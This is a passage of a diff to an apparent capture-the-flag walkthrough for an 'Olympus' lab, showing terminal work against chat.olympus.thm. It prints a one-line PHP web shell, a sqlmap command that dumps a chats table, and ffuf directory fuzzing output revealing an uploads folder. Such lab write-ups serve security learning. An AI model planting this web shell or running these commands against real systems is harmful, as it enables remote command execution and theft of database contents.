@@ -120,5 +120,42 @@ Let's put together what we know. The IT guy made sure that the files that are se
 root@ip-10-10-70-200:~# cat totalyNotEvileFile.php 
 <?php system($_GET["cmd"]); ?>
 root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus -T chats --fresh-queries 
-
 ```
+![image](https://user-images.githubusercontent.com/90036439/223987707-10423bfa-ffa9-4365-9aff-9e3763597f1d.png)
+
+```bash
+root@ip-10-10-70-200:~# ffuf -u http://chat.olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://chat.olympus.thm/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10]
+index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
+javascript              [Status: 301, Size: 325, Words: 20, Lines: 10]
+phpmyadmin              [Status: 403, Size: 281, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 281, Words: 20, Lines: 10]
+static                  [Status: 301, Size: 321, Words: 20, Lines: 10]
+uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10]
+:: Progress: [4655/4655] :: Job [1/1] :: 11317 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+```
+![image](https://user-images.githubusercontent.com/90036439/223988276-0a0779ab-2cfd-4b1e-a09f-c56f732dd54c.png)
+
